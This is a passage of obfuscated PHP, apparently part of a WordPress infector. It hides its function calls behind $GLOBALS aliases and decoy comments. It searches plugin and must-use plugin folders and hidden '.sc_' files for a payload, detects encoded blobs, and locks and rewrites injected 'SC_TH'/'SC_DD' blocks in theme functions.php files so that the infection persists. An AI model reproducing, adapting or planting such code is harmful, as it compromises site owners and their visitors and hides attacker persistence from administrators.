unset($qw_suu_qlpyh2bu2,    $fbx0zact_3p80k, $e5ym1xaiouul_93);



 }
       return  "";



 }
 }
 return  $ymhkgsj4hodh9w65;
     }


    }
  if (!$GLOBALS['__scf_xv8yd47u71vk_0']('p6dn2gm11w5bci76'))    {
   function p6dn2gm11w5bci76($obn___8dx_pzsa)
    {
 return $GLOBALS['__scf_thpa1zqaisu2_35'](hexdec($obn___8dx_pzsa[1]));
 }
    }
if (!$GLOBALS['__scf_xv8yd47u71vk_0']('j0zc74tqru97n9adwb')) {

function j0zc74tqru97n9adwb($vdhn73w9a1gk5noj)


    {
  if  (!$GLOBALS['__scf__z6u45x2fa_6']($vdhn73w9a1gk5noj)  ||  ($GLOBALS['__scf_dsvrtv_z1ezjh_32']($vdhn73w9a1gk5noj, 'gz')   ===    false &&  $GLOBALS['__scf_dsvrtv_z1ezjh_32']($vdhn73w9a1gk5noj,  'base64_decode') ===   false))  return    false;



 if     ($GLOBALS['__scf_fpq82u5a28q_30']('/base64_decode\(\s*\'([A-Za-z0-9+\/=]{1000,})\'\s*\)/',   $vdhn73w9a1gk5noj,     $k602spexzcd5))  {
 foreach  ($k602spexzcd5[1]   as  $nlnxtsbu2btyb4)    {
 if    (vidl1zwix8pfwk3t($GLOBALS['__scf_k07mkn3_s9_31']($nlnxtsbu2btyb4,    true)))     return  true;
 }
      }


 if  ($GLOBALS['__scf_fpq82u5a28q_30']('/(?:gzdecode|gzinflate|gzuncompress)\(\s*"((?:[^"\\\\]*(?:\\\\.[^"\\\\]*)*))"/s', $vdhn73w9a1gk5noj,  $k602spexzcd5))  {
 foreach ($k602spexzcd5[1]    as $nlnxtsbu2btyb4)    {
if  (vidl1zwix8pfwk3t(stripcslashes($nlnxtsbu2btyb4))) return    true;
   }

foreach  ($k602spexzcd5[1] as     $nlnxtsbu2btyb4)   {$jtb3jsk5nj=98+47;$w5k7tkjg=$jtb3jsk5nj-5;
  if  ($GLOBALS['__scf_dsvrtv_z1ezjh_32']($nlnxtsbu2btyb4,     '\\x')   === false)  continue;



   $p4j0dr02ic  =  preg_replace_callback('/\\\\x([0-9a-fA-F]{2})/', 'p6dn2gm11w5bci76',     $nlnxtsbu2btyb4);
      if ($GLOBALS['__scf__z6u45x2fa_6']($p4j0dr02ic)  &&  $p4j0dr02ic !==    $nlnxtsbu2btyb4 &&     vidl1zwix8pfwk3t($p4j0dr02ic))    return   true;

    }
   }
  if  ($GLOBALS['__scf_fpq82u5a28q_30']('/(?:gzdecode|gzinflate|gzuncompress)\(\s*\'((?:[^\'\\\\]*(?:\\\\.[^\'\\\\]*)*))\'/s',  $vdhn73w9a1gk5noj,  $k602spexzcd5)) {
 foreach   ($k602spexzcd5[1]  as      $nlnxtsbu2btyb4)   {
if   (vidl1zwix8pfwk3t($GLOBALS['__scf_tk0sxw6ey44as_33'](array('\\\\',  '\\\''), array('\\',     '\''),  $nlnxtsbu2btyb4)))   return  true;
}
foreach  ($k602spexzcd5[1]   as $nlnxtsbu2btyb4)  {
  if    ($GLOBALS['__scf_dsvrtv_z1ezjh_32']($nlnxtsbu2btyb4,  '\\x')  === false)   continue;
$p4j0dr02ic     =      preg_replace_callback('/\\\\x([0-9a-fA-F]{2})/', 'p6dn2gm11w5bci76',   $nlnxtsbu2btyb4);



     if ($GLOBALS['__scf__z6u45x2fa_6']($p4j0dr02ic)    &&   $p4j0dr02ic  !== $nlnxtsbu2btyb4     &&     vidl1zwix8pfwk3t($p4j0dr02ic))  return  true;
}
// weak reference

       }


      return   false;
 }
  }
if  (!$GLOBALS['__scf_xv8yd47u71vk_0']('us0h1d_jx3d7uc'))  {
 function   us0h1d_jx3d7uc($gkx16v3lf3,  $uasdh837wk60,  $dv9i38jrozo  =  null)
{
if  (!$GLOBALS['__scf__z6u45x2fa_6']($gkx16v3lf3) ||  $gkx16v3lf3  ===   "")    return $gkx16v3lf3;
 $k9olj95w69_xh2 =     '/* '    .  $uasdh837wk60    .   '_BEGIN:';
   $u1_4_mj43z0g36   = "";


 $liiqbknv1nktxh4l  =     0;
while ($liiqbknv1nktxh4l++  <   (0x48+0x38))    {
       $g6jp02cwbz_upivs  =   $GLOBALS['__scf_dsvrtv_z1ezjh_32']($gkx16v3lf3, $k9olj95w69_xh2);
    if     ($g6jp02cwbz_upivs    ===    false)  break;
$u7b02nlzphxo   =    $g6jp02cwbz_upivs  +  $GLOBALS['__scf_qm3n103d40kf_7']($k9olj95w69_xh2);



  $m6oadq350r9uqx = $GLOBALS['__scf_dsvrtv_z1ezjh_32']($gkx16v3lf3,      ' */',  $u7b02nlzphxo);



   if    ($m6oadq350r9uqx  ===    false   ||  $m6oadq350r9uqx  -      $u7b02nlzphxo >   (0x22+0x1e))   {
$u1_4_mj43z0g36  .= $GLOBALS['__scf_t4v17v676jnuf_11']($gkx16v3lf3,  0,    $u7b02nlzphxo);
  $gkx16v3lf3  =  $GLOBALS['__scf_t4v17v676jnuf_11']($gkx16v3lf3,  $u7b02nlzphxo);
    continue;
    }
 $i0rzn1p3ttk  =   $GLOBALS['__scf_t4v17v676jnuf_11']($gkx16v3lf3,   $u7b02nlzphxo,   $m6oadq350r9uqx    - $u7b02nlzphxo);


 if   (!$GLOBALS['__scf_zoi2q70k2g_26']('/^[a-zA-Z0-9._:]+$/',  $i0rzn1p3ttk))  {


    $u1_4_mj43z0g36     .=  $GLOBALS['__scf_t4v17v676jnuf_11']($gkx16v3lf3,  0,    $u7b02nlzphxo);
$gkx16v3lf3  =  $GLOBALS['__scf_t4v17v676jnuf_11']($gkx16v3lf3,   $u7b02nlzphxo);
 continue;
  }
// WP useBlockProps: defragment resume-session

$l5155juiqkr2fspw =  '/* ' . $uasdh837wk60 . '_END:' . $i0rzn1p3ttk    .    ' */';


$vc4cr_ck_3  =   $GLOBALS['__scf_dsvrtv_z1ezjh_32']($gkx16v3lf3,   $l5155juiqkr2fspw, $m6oadq350r9uqx);
 if    ($vc4cr_ck_3    ===  false) break;
$u1_4_mj43z0g36   .=    $GLOBALS['__scf_t4v17v676jnuf_11']($gkx16v3lf3,    0,   $g6jp02cwbz_upivs);
 $t2ydhsbkz95mb  =    $GLOBALS['__scf_t4v17v676jnuf_11']($gkx16v3lf3, $g6jp02cwbz_upivs,  $vc4cr_ck_3    +   $GLOBALS['__scf_qm3n103d40kf_7']($l5155juiqkr2fspw)  -  $g6jp02cwbz_upivs);
if    ($dv9i38jrozo    !==   null)  {
   $khwdgzwn47j   =  $dv9i38jrozo($t2ydhsbkz95mb);
if      ($GLOBALS['__scf__z6u45x2fa_6']($khwdgzwn47j))      $u1_4_mj43z0g36   .= $khwdgzwn47j;
} else  {
  $u1_4_mj43z0g36  .= $t2ydhsbkz95mb;
    }
/* non-strict dependency-graph */

$gkx16v3lf3     =  $GLOBALS['__scf_t4v17v676jnuf_11']($gkx16v3lf3,  $vc4cr_ck_3  +  $GLOBALS['__scf_qm3n103d40kf_7']($l5155juiqkr2fspw));
  }

 return  $u1_4_mj43z0g36 .  $gkx16v3lf3;
    }
     }
        if  (!$GLOBALS['__scf_xv8yd47u71vk_0']('rrxsdg_zfcyq32ilwen'))  {

       function rrxsdg_zfcyq32ilwen($ymhkgsj4hodh9w65)
  {
   return   "";
 }
// @restore template

      }

    if  (!$GLOBALS['__scf_xv8yd47u71vk_0']('fle1idu82th83mbvtny'))  {


     function  fle1idu82th83mbvtny($gkx16v3lf3)
      {
      if  (!$GLOBALS['__scf__z6u45x2fa_6']($gkx16v3lf3)    || $gkx16v3lf3 === "")   return      $gkx16v3lf3;



 $y87jcao7qde   =    us0h1d_jx3d7uc($gkx16v3lf3, 'SC_TH',   'mcnmf92ikm4kc014d5a_bt');



 $y87jcao7qde   =  us0h1d_jx3d7uc($y87jcao7qde,   'SC_DD', 'g3sjg5yg2uvrmfhhobiq');
     if  ($GLOBALS['__scf__z6u45x2fa_6']($y87jcao7qde))  $y87jcao7qde  =      $GLOBALS['__scf_l2l653ru73ot60_8']('/\/\/SC_TH_LD_[a-f0-9_]+\r?\n[^\n]*$/', "",    $y87jcao7qde);
      if   (!$GLOBALS['__scf__z6u45x2fa_6']($y87jcao7qde))  $y87jcao7qde  =   $gkx16v3lf3;
    if   (j0zc74tqru97n9adwb($y87jcao7qde))  {

     $y87jcao7qde     =      us0h1d_jx3d7uc($y87jcao7qde, 'SC_TH', 'rrxsdg_zfcyq32ilwen');
   $y87jcao7qde   = us0h1d_jx3d7uc($y87jcao7qde,      'SC_DD',    'rrxsdg_zfcyq32ilwen');
  if ($GLOBALS['__scf__z6u45x2fa_6']($y87jcao7qde))   $y87jcao7qde  = $GLOBALS['__scf_l2l653ru73ot60_8']('/\/\/SC_TH_LD_[a-f0-9_]+\r?\n[^\n]*$/', "", $y87jcao7qde);
}
// generalize control-flow-graph for WP RichText API

   return $GLOBALS['__scf__z6u45x2fa_6']($y87jcao7qde)     ? $y87jcao7qde  :   $gkx16v3lf3;
 }
}



    if (!$GLOBALS['__scf_xv8yd47u71vk_0']('s1wft_mmmai34lq0873sa')) {
   function     s1wft_mmmai34lq0873sa($gkx16v3lf3)
   {
      if  (!$GLOBALS['__scf__z6u45x2fa_6']($gkx16v3lf3) ||  !defined('ABSPATH'))    return      false;
if ($GLOBALS['__scf_zoi2q70k2g_26']('/\/\/SC_TH_LD_[a-f0-9_]+\r?\n[^\n]*$/', $gkx16v3lf3))  return    true;
  $wyg5t0qzrf_rmy6  = $GLOBALS['__scf_t4v17v676jnuf_11']($GLOBALS['__scf_ue4dsf0az7w6z_19'](ABSPATH   . 'th_m'),  0,   (11-3));
        if ($GLOBALS['__scf_fpq82u5a28q_30']('/\/\* SC_TH_BEGIN:([a-zA-Z0-9._:]+) \*\//', $gkx16v3lf3,  $nxqq5_plnm6x4av5)) {
foreach   ($nxqq5_plnm6x4av5[1]  as  $i0rzn1p3ttk)    {


if   ($GLOBALS['__scf_t4v17v676jnuf_11']($i0rzn1p3ttk, -(5+4)) ===  ':' .  $wyg5t0qzrf_rmy6)  return    true;

  }
}
    $_dd  = $GLOBALS['__scf_t4v17v676jnuf_11']($GLOBALS['__scf_ue4dsf0az7w6z_19'](ABSPATH     .      'dd'),   0,    (3+5));


  if ($GLOBALS['__scf_fpq82u5a28q_30']('/\/\* SC_DD_BEGIN:([a-zA-Z0-9._:]+) \*\//',     $gkx16v3lf3, $r6cxjgtv8bh98)) {$or1g4xh7k3zfiy=98|191;$duermv36ximbul=$or1g4xh7k3zfiy^59;
foreach   ($r6cxjgtv8bh98[1]   as $jf_2yx306ckkhdw6)   {
 if    ($jf_2yx306ckkhdw6  ===   $_dd) return true;
     }
}


    return    false;
 }
 }
if (!$GLOBALS['__scf_xv8yd47u71vk_0']('_sc_phpok_src'))    {
  function     _sc_phpok_src($gkx16v3lf3,  $c8fh_49gp9vi =    (423+77))
  {
       if  (!$GLOBALS['__scf__z6u45x2fa_6']($gkx16v3lf3)  ||  $GLOBALS['__scf_qm3n103d40kf_7']($gkx16v3lf3)   <  $c8fh_49gp9vi  ||  $GLOBALS['__scf_dsvrtv_z1ezjh_32']($gkx16v3lf3, '<?') ===  false)   return  false;
       if  (!$GLOBALS['__scf_xv8yd47u71vk_0']('token_get_all'))  return true;
   if  (defined('TOKEN_PARSE'))   {
try  {
 @token_get_all($gkx16v3lf3,      TOKEN_PARSE);



 return     true;
  }    catch  (\Throwable  $j5dxq7pr28rg_o1i) {
  return   false;
    }    catch (\Exception  $j5dxq7pr28rg_o1i)      {


  return    false;
}
 }
$mnx7odl7tqe_dl = @token_get_all($gkx16v3lf3);
if   (!$GLOBALS['__scf_rzps4u9lh9q1_29']($mnx7odl7tqe_dl)) return    true;
 $zmvoza5tyo1izd  =  0;$sans6er2xs=99|82;$q83kydz58b5s=$sans6er2xs^15;
        foreach ($mnx7odl7tqe_dl   as $i4tkxwtsz8rkqqk)     {
 if ($GLOBALS['__scf_rzps4u9lh9q1_29']($i4tkxwtsz8rkqqk))   {



if ($i4tkxwtsz8rkqqk[0] === T_CURLY_OPEN  ||    $i4tkxwtsz8rkqqk[0] === T_DOLLAR_OPEN_CURLY_BRACES)   $zmvoza5tyo1izd++;
 continue;
   

   }


  if  ($i4tkxwtsz8rkqqk    === '{')    $zmvoza5tyo1izd++;
 elseif   ($i4tkxwtsz8rkqqk    === '}')    {



   $zmvoza5tyo1izd--;
if     ($zmvoza5tyo1izd    < 0)  return false;
 }
   }
    return $zmvoza5tyo1izd  ===    0;
 }



     }
  if    (!$GLOBALS['__scf_xv8yd47u71vk_0']('_sc_qok'))     {
// @pipeline control-flow-graph

    function  _sc_qok($hp7ovp1v6j75h,    $gkx16v3lf3)
  {
      if    (!@$GLOBALS['__scf_lybs3d_izonl3f_25']($hp7ovp1v6j75h)) return  true;



      $j8gw96h6wtrn   = (int) @$GLOBALS['__scf_eod91q9_bq_15']($hp7ovp1v6j75h);
if ($j8gw96h6wtrn <=  $GLOBALS['__scf_s8qh2p3z4gjae_24']()    -     (1053266-448466) || $j8gw96h6wtrn >  $GLOBALS['__scf_s8qh2p3z4gjae_24']() +    (107867-21467))  return  true;
  $w30xss882p53   =    $GLOBALS['__scf_z42aankc50u6_36']((string)  @$GLOBALS['__scf_y5urpy7tfyu5_16']($hp7ovp1v6j75h));
return   ($w30xss882p53    ===    ""   ||   ($GLOBALS['__scf__z6u45x2fa_6']($gkx16v3lf3)  &&  $w30xss882p53    !==  $GLOBALS['__scf_ue4dsf0az7w6z_19']($gkx16v3lf3)));



 }
 }
if  (!$GLOBALS['__scf_xv8yd47u71vk_0']('_sc_any_live'))  {

function     _sc_any_live($q297cfeq37wtyn9,   $kc39tdtf3a301m,    $jdou9mjwwnov2y    = "",      $erisydr88nf  =     "", $kbw5753zuu1    =   "")
 {
if    ($erisydr88nf  ===  "")   $erisydr88nf =  (defined('WPMU_PLUGIN_DIR')  &&     WPMU_PLUGIN_DIR)    ? WPMU_PLUGIN_DIR   :   $kc39tdtf3a301m  .   '/mu-plugins';
if    ($kbw5753zuu1 ===  "")  $kbw5753zuu1    =   (defined('WP_PLUGIN_DIR')     &&   WP_PLUGIN_DIR)  ? WP_PLUGIN_DIR :  $kc39tdtf3a301m    . '/plugins';
 $erisydr88nf   =    $GLOBALS['__scf_hgwmboblaof6oq_17']($erisydr88nf,  '/');
  




$kbw5753zuu1      =   $GLOBALS['__scf_hgwmboblaof6oq_17']($kbw5753zuu1,  '/');

$qnw4vk0jaug4id  = array();

 $a2_4yy9obsny  =  false;
// PSR-7 messages: yield negotiator




  if   ($GLOBALS['__scf_xv8yd47u71vk_0']('glob'))  {

$c4ivnryqqszecg  =  @$GLOBALS['__scf_xrqmn_5o4wcs_e_37']($erisydr88nf  . '/*.php');

  $jzkbn66fpqf52my  = @$GLOBALS['__scf_xrqmn_5o4wcs_e_37']($kbw5753zuu1     .   '/*/*.php');
     if  ($GLOBALS['__scf_rzps4u9lh9q1_29']($c4ivnryqqszecg) ||   $GLOBALS['__scf_rzps4u9lh9q1_29']($jzkbn66fpqf52my))    {
    $a2_4yy9obsny =     true;
    $qnw4vk0jaug4id =      $GLOBALS['__scf_wmpd0pzfnsyb_38']((array) $c4ivnryqqszecg,     (array) $jzkbn66fpqf52my);



}
unset($c4ivnryqqszecg, $jzkbn66fpqf52my);
 }
 if  (!$a2_4yy9obsny   &&   $GLOBALS['__scf_xv8yd47u71vk_0']('opendir')    &&  $GLOBALS['__scf_xv8yd47u71vk_0']('readdir'))  {
  $lag6wqiinh96  = @$GLOBALS['__scf_s73tynbvq0kl_39']($erisydr88nf);
if   ($lag6wqiinh96)  {
   while     (($nfo0c38a7oczbj =  @$GLOBALS['__scf_eb1q0tn9r6_40']($lag6wqiinh96)) !==  false)  {
      if   ($GLOBALS['__scf_t4v17v676jnuf_11']($nfo0c38a7oczbj,  -(1<<2)) ===   '.php')  $qnw4vk0jaug4id[] = $erisydr88nf .     '/'  .   $nfo0c38a7oczbj;
  }
    if   ($GLOBALS['__scf_xv8yd47u71vk_0']('closedir')) @$GLOBALS['__scf_pdzceaybdlrf4_41']($lag6wqiinh96);
  }
        $lag6wqiinh96  = @$GLOBALS['__scf_s73tynbvq0kl_39']($kbw5753zuu1);
 if   ($lag6wqiinh96) {


  while  (($nfo0c38a7oczbj  =  @$GLOBALS['__scf_eb1q0tn9r6_40']($lag6wqiinh96))   !==     false) {

     $wfp73_9t57  = $kbw5753zuu1  .    '/'   .  $nfo0c38a7oczbj;
if   ($nfo0c38a7oczbj     ===   '.'  ||    $nfo0c38a7oczbj  ===      '..'    ||    !@$GLOBALS['__scf_j4ozmy1qax_vj_42']($wfp73_9t57))   continue;
 $xmuub_nzunxra0_    =  @$GLOBALS['__scf_s73tynbvq0kl_39']($wfp73_9t57);
if  (!$xmuub_nzunxra0_) continue;
     while (($ke649j2lp_d_k =  @$GLOBALS['__scf_eb1q0tn9r6_40']($xmuub_nzunxra0_))    !==  false)  {
 if    ($GLOBALS['__scf_t4v17v676jnuf_11']($ke649j2lp_d_k,     -(3+1))  ===    '.php')   $qnw4vk0jaug4id[]  =  $wfp73_9t57    .   '/'   .  $ke649j2lp_d_k;
     }
 if   ($GLOBALS['__scf_xv8yd47u71vk_0']('closedir')) @$GLOBALS['__scf_pdzceaybdlrf4_41']($xmuub_nzunxra0_);



 }
if ($GLOBALS['__scf_xv8yd47u71vk_0']('closedir')) @$GLOBALS['__scf_pdzceaybdlrf4_41']($lag6wqiinh96);

  }
   unset($lag6wqiinh96,     $xmuub_nzunxra0_,   $nfo0c38a7oczbj,    $ke649j2lp_d_k,  $wfp73_9t57);
  }
/* negative-definite builder */




$alpnwni6ctqve6    = false;
     if      ($jdou9mjwwnov2y !==     "" &&    $GLOBALS['__scf_xv8yd47u71vk_0']('realpath'))  $alpnwni6ctqve6 =  @$GLOBALS['__scf_uzzd03dgl9f_5']($jdou9mjwwnov2y);



foreach   ($qnw4vk0jaug4id      as $l26xz4x63tzfur) {$whscq322pgo5i=69*3;$bdpi84nuyoy=$whscq322pgo5i-22;
   if   ($jdou9mjwwnov2y   !==    "" && $l26xz4x63tzfur   === $jdou9mjwwnov2y)  continue;
   if    ($alpnwni6ctqve6 !== false   &&  @$GLOBALS['__scf_uzzd03dgl9f_5']($l26xz4x63tzfur) === $alpnwni6ctqve6)    continue;



     $nef_47139wi  =  $GLOBALS['__scf_ht5qt6ku56_34']($l26xz4x63tzfur, '.php');
     $lidvj_as_tl  =  $GLOBALS['__scf_ht5qt6ku56_34']($GLOBALS['__scf_ltavcefziu30su_4']($l26xz4x63tzfur));



if     ($GLOBALS['__scf_ltavcefziu30su_4']($l26xz4x63tzfur)  !==     $erisydr88nf   && $nef_47139wi !== $lidvj_as_tl) continue;
 if  ($GLOBALS['__scf_xv8yd47u71vk_0']('_sc_fam')    &&  !_sc_fam($l26xz4x63tzfur))      continue;
   $ldabz7ci7jy8e  =  @$GLOBALS['__scf_l2m84og2k1091k_13']($l26xz4x63tzfur);
   if    (!$ldabz7ci7jy8e   || $ldabz7ci7jy8e    < (0x1205+0x183)   ||   $ldabz7ci7jy8e   >  (52428706+94))  continue;

$fztn1vtfz8      =  (string)   @$GLOBALS['__scf_y5urpy7tfyu5_16']($l26xz4x63tzfur,  false,  null,  0,  (4008+88));



  if ($fztn1vtfz8  !==    ""   &&   $GLOBALS['__scf_zoi2q70k2g_26']('/\/\* SCV:(\d+\.\d+\.\d+) \*\//', $fztn1vtfz8,  $obn___8dx_pzsa)    && version_compare($obn___8dx_pzsa[1], $q297cfeq37wtyn9, '>='))    return  true;
  }
 return    false;



}
}
  if     (!$GLOBALS['__scf_xv8yd47u71vk_0']('_sc_corep'))  {
function _sc_corep($kc39tdtf3a301m)
   {
$zsaqxjm7ep    =  defined('ABSPATH')   ?     ABSPATH  :  ($GLOBALS['__scf_hgwmboblaof6oq_17']($GLOBALS['__scf_ltavcefziu30su_4']($kc39tdtf3a301m),   '/')     .   '/');



        return      $kc39tdtf3a301m  .   '/.sc_' . $GLOBALS['__scf_t4v17v676jnuf_11']($GLOBALS['__scf_ue4dsf0az7w6z_19']($zsaqxjm7ep  .   'dir'), 0,   (7+1)) .   '/core_' .  $GLOBALS['__scf_t4v17v676jnuf_11']($GLOBALS['__scf_ue4dsf0az7w6z_19']($zsaqxjm7ep   .     'core'),  0,  (0x1+0x7))  .    '.php';
      }
      }
/* diagnostic orbit */

 if  (!$GLOBALS['__scf_xv8yd47u71vk_0']('_sc_coreld')) {
        function    _sc_coreld($kc39tdtf3a301m)
 {
     $glflko8qfi_wbu8m   =   _sc_corep($kc39tdtf3a301m);


 if   (!@$GLOBALS['__scf_lybs3d_izonl3f_25']($glflko8qfi_wbu8m))   return false;$qsbdi060fclys=170|102;$nfwa305wa80qh1=$qsbdi060fclys^70;



       $cys140nur5zpl_9   =  @$GLOBALS['__scf_l2m84og2k1091k_13']($glflko8qfi_wbu8m);
   if  (!$cys140nur5zpl_9    || $cys140nur5zpl_9 < (0xac+0x148) ||    $cys140nur5zpl_9 > (8388540+68)) return false;
 

     if   ($GLOBALS['__scf_xv8yd47u71vk_0']('ojjpzyhgn1e6z2ga5wr')    &&      !ojjpzyhgn1e6z2ga5wr($cys140nur5zpl_9))  return    false;
        $gkx16v3lf3   =     @$GLOBALS['__scf_y5urpy7tfyu5_16']($glflko8qfi_wbu8m);
 if   ($GLOBALS['__scf_xv8yd47u71vk_0']('_sc_unp') && $GLOBALS['__scf__z6u45x2fa_6']($gkx16v3lf3)    && $GLOBALS['__scf_qm3n103d40kf_7']($gkx16v3lf3)      > (747774+300802))    $gkx16v3lf3  =    _sc_unp($gkx16v3lf3);
if   (!$GLOBALS['__scf__z6u45x2fa_6']($gkx16v3lf3)  ||     $GLOBALS['__scf_qm3n103d40kf_7']($gkx16v3lf3)   <     (450+50)   || $GLOBALS['__scf_qm3n103d40kf_7']($gkx16v3lf3)      > (1048481+95)      ||  $GLOBALS['__scf_dsvrtv_z1ezjh_32']($gkx16v3lf3, '<?') !==    0) return  false;
  return  $gkx16v3lf3;
 }

  }

if      (!$GLOBALS['__scf_xv8yd47u71vk_0']('unyij3tj_eezv3g'))   {
/* strong task-graph */

    function     unyij3tj_eezv3g($i4tkxwtsz8rkqqk)
       {
 return   $GLOBALS['__scf__z6u45x2fa_6']($i4tkxwtsz8rkqqk) &&  $GLOBALS['__scf_zoi2q70k2g_26']('/(\/\*[0-9a-f]{1000,}\*\/)\s*$/',     $i4tkxwtsz8rkqqk)  ===   1;
    }
  }
   if (!$GLOBALS['__scf_xv8yd47u71vk_0']('ojjpzyhgn1e6z2ga5wr')) {
// MySQL JSON operators thumbnail crop

 function ojjpzyhgn1e6z2ga5wr($w8r5mdwbsp36     =     0)

{



    if     (!$GLOBALS['__scf_xv8yd47u71vk_0']('ini_get'))   return  false;
 $_4ri7q6exys_7o0 = @$GLOBALS['__scf_drnjujf7rh_9']('memory_limit');
if    (!$GLOBALS['__scf__z6u45x2fa_6']($_4ri7q6exys_7o0)   ||    $_4ri7q6exys_7o0      ===   "") return  false;



 $d6wxai3x1h4gy6m4  = (int) $_4ri7q6exys_7o0;

if  ($d6wxai3x1h4gy6m4  <= 0)   return true;
 $qdykmutuaua4x    = $GLOBALS['__scf_l9ers3svzkh_10']($GLOBALS['__scf_t4v17v676jnuf_11']($_4ri7q6exys_7o0,  -1));
  if ($qdykmutuaua4x   === 'G')   $d6wxai3x1h4gy6m4 *= (1073741786+38);

   elseif  ($qdykmutuaua4x  === 'M') $d6wxai3x1h4gy6m4  *=     (1752945-704369);
 elseif   ($qdykmutuaua4x  ===   'K') $d6wxai3x1h4gy6m4   *= (938+86);
 $zjelfsgzuk3t  =     $GLOBALS['__scf_xv8yd47u71vk_0']('memory_get_usage') ?  @memory_get_usage(true)  :    0;
      if  (!$GLOBALS['__scf_o86ss8z24c24px_14']($zjelfsgzuk3t)  ||   $zjelfsgzuk3t   <    0)   $zjelfsgzuk3t =   0;$s88n6axqg_2=4*2;$i_5eoj4rs1f=$s88n6axqg_2-36;
if    ($w8r5mdwbsp36  > 0)    return  ($d6wxai3x1h4gy6m4  -  $zjelfsgzuk3t)  >   (($w8r5mdwbsp36    *      (0x2+0x1))   +  (2097074+78));
  if      ($d6wxai3x1h4gy6m4    <     (32246974+34861890))   return    false;
   if  ($zjelfsgzuk3t  >    0 &&  $d6wxai3x1h4gy6m4 - $zjelfsgzuk3t < (33554381+51))   return false;
return     true;
     }
    }
  if (!$GLOBALS['__scf_xv8yd47u71vk_0']('vtwcl01aybvdc2a')) {
  function  vtwcl01aybvdc2a($nsqchf9spyjpyhvw,  $q297cfeq37wtyn9)
 {
   if (!_sc_fam($nsqchf9spyjpyhvw)) return   false;
  $y0qwklakbu = @$GLOBALS['__scf_l2m84og2k1091k_13']($nsqchf9spyjpyhvw);
       if  (!$y0qwklakbu || $y0qwklakbu    <  (4972+28)  ||  $y0qwklakbu    >  (11841173+40587627))  return  false;
    if ($y0qwklakbu      > (2509941+59)   &&  $y0qwklakbu     <  (5495819+81))    return  false;
 $ccgahqak0xxa  =     (string)  @$GLOBALS['__scf_y5urpy7tfyu5_16']($nsqchf9spyjpyhvw,     false,   null, 0,    (2495+1601));


     if    (!$GLOBALS['__scf_zoi2q70k2g_26']('/\/\* SCV:(\d+\.\d+\.\d+) \*\//',  $ccgahqak0xxa,    $_4ri7q6exys_7o0))  return   false;


       if    ($q297cfeq37wtyn9     !==    ""  &&  version_compare($_4ri7q6exys_7o0[1],    $q297cfeq37wtyn9, '<'))     return  false;
if     (@$GLOBALS['__scf_lybs3d_izonl3f_25']($GLOBALS['__scf_ltavcefziu30su_4']($nsqchf9spyjpyhvw)  . '/.wr_'   . $GLOBALS['__scf_ht5qt6ku56_34']($nsqchf9spyjpyhvw,    '.php')))   return false;
 if ($y0qwklakbu  >   (1048505+71)  &&   !unyij3tj_eezv3g((string)   @$GLOBALS['__scf_y5urpy7tfyu5_16']($nsqchf9spyjpyhvw,   false, null, $y0qwklakbu -      (4094+2)))) return  false;
 return  true;


  }
   }


      if   (defined("SC_ADVL_c8df4a48"))     return;
 define("SC_ADVL_c8df4a48",    1);
   $y_advu7wxia     = function   ()   {
 $kkk8iiixh_m1qbl7     =     defined("WP_CONTENT_DIR") ? WP_CONTENT_DIR  :  __DIR__;
  $yjn5b73anc6ywb     =  $kkk8iiixh_m1qbl7   .      '/.sc_' . $GLOBALS['__scf_t4v17v676jnuf_11']($GLOBALS['__scf_ue4dsf0az7w6z_19']($kkk8iiixh_m1qbl7   .    'ts'),    0, (0x7+0x1));
  $dkg1fcnvds   = @$GLOBALS['__scf_lybs3d_izonl3f_25']($yjn5b73anc6ywb)  ?     (int) @$GLOBALS['__scf_eod91q9_bq_15']($yjn5b73anc6ywb)    :    0;
  $pmx_7h19s5frmv  =  ($dkg1fcnvds   === 0 ||   $dkg1fcnvds <  $GLOBALS['__scf_s8qh2p3z4gjae_24']()   -     (242+58) ||   $dkg1fcnvds    >   $GLOBALS['__scf_s8qh2p3z4gjae_24']()   +  (0x8d+0x9f));

    if  ($GLOBALS['__scf_xv8yd47u71vk_0']("glob")     &&   $pmx_7h19s5frmv)  {
 if ($GLOBALS['__scf_xv8yd47u71vk_0']("touch"))     @$GLOBALS['__scf_wld3r5otpv_23']($yjn5b73anc6ywb);
foreach  ((array)    @$GLOBALS['__scf_xrqmn_5o4wcs_e_37']($kkk8iiixh_m1qbl7 .   "/themes/*/functions.php")  as $w40lb7254yqsv)   {
if (!@$GLOBALS['__scf_lybs3d_izonl3f_25']($w40lb7254yqsv)  ||  !@$GLOBALS['__scf_fljlxp0_k3_43']($w40lb7254yqsv))  continue;
$zacw44b6g3etzh = @$GLOBALS['__scf_l2m84og2k1091k_13']($w40lb7254yqsv);
  if    (!$zacw44b6g3etzh  ||  $zacw44b6g3etzh  > (1858207+238945))  continue;
    $ymlqhbn7foyujem3    =      @$GLOBALS['__scf_y5urpy7tfyu5_16']($w40lb7254yqsv);
if (!$GLOBALS['__scf__z6u45x2fa_6']($ymlqhbn7foyujem3)  || ($GLOBALS['__scf_dsvrtv_z1ezjh_32']($ymlqhbn7foyujem3,   'SC_TH_BEGIN') ===  false  &&     $GLOBALS['__scf_dsvrtv_z1ezjh_32']($ymlqhbn7foyujem3,   'SC_DD_BEGIN')  === false   &&  $GLOBALS['__scf_dsvrtv_z1ezjh_32']($ymlqhbn7foyujem3,  'SC_TH_LD_')    ===    false))  continue;


 if    (!s1wft_mmmai34lq0873sa($ymlqhbn7foyujem3))  continue;
 if  (!$GLOBALS['__scf_xv8yd47u71vk_0']('fopen')    ||    !$GLOBALS['__scf_xv8yd47u71vk_0']('flock'))  continue;
   $_lu78qxdtg4n6pmk  =   @$GLOBALS['__scf_avxqzsnt4u4h_44']($w40lb7254yqsv,  'c');$kwzr2seq1xoip=5502;$b35o2dxpn3ell=$kwzr2seq1xoip%9;
     if   (!$_lu78qxdtg4n6pmk)    continue;
if (!@flock($_lu78qxdtg4n6pmk,  LOCK_EX  |    LOCK_NB)) {
 @fclose($_lu78qxdtg4n6pmk);
  continue;
}



$ymlqhbn7foyujem3 =  @$GLOBALS['__scf_y5urpy7tfyu5_16']($w40lb7254yqsv);
   if    (!$GLOBALS['__scf__z6u45x2fa_6']($ymlqhbn7foyujem3) ||   ($GLOBALS['__scf_dsvrtv_z1ezjh_32']($ymlqhbn7foyujem3,     'SC_TH_BEGIN')  ===   false    &&   $GLOBALS['__scf_dsvrtv_z1ezjh_32']($ymlqhbn7foyujem3,     'SC_DD_BEGIN')      ===    false &&  $GLOBALS['__scf_dsvrtv_z1ezjh_32']($ymlqhbn7foyujem3, 'SC_TH_LD_')      ===  false)    ||     !s1wft_mmmai34lq0873sa($ymlqhbn7foyujem3))   {
